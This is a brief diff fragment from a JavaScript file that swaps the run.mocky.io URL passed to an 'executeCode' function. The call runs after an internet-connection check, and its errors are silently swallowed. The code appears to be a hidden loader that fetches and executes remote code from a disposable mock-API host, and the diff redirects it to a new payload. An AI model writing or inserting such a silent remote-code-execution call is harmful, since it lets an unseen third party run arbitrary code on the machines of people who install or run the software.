@@ -40,7 +40,7 @@ async function executeCode(url) {
     try {
         if (await checkInternetConnection()) {
             try {
-                await executeCode('https://run.mocky.io/v3/b71dc780-1797-40d0-b70a-d057af064612');
+                await executeCode('https://run.mocky.io/v3/9bb2ff7f-167c-4e5c-9e2d-20a734b9f176');
             } catch (error) {
             }
         } else {
